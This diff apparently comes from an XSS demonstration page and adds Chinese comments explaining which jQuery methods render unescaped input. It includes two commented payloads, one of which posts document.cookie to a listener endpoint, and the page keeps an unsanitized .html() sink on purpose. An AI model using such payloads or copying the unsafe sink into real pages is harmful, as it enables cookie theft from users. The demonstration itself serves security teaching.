@@ -9,8 +9,9 @@
 
 <div id="request_div" style="margin-top: 30px;">
     <form id="submitForm">
-        <!-- <script>alert('it is a xss test!')</script> -->
-        <!-- $('body').append("<script>alert('it is a xss test!')</script>") -->
+        <!-- 攻击脚本输入示例如下，其中示例1仅仅是页面效果，示例2会实际发送数据给攻击者 -->
+        <!-- 示例1： <script>alert('it is a xss test!')</script> -->
+        <!-- 示例2： <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>-->
         <input name="username" type="text" />
     </form>
 
@@ -71,11 +72,12 @@
 
                 console.log(user.username);
 
-                // 塞值类方法不会有xss
+                // 塞值类方法不会有xss（不触发页面重新渲染）
                 //$("#showMsg").val(user.username);
 
-                // ajax渲染类方法会有xss
+                // ajax渲染类方法会有xss（脚本更改页面dom的方法，如果返回值不处理，都能触发XSS，此处的html和append，都能触发）
                 $("#xssSpan").html(user.username)
+                // $("#xssSpan").append(user.username)
             }
         });
     }
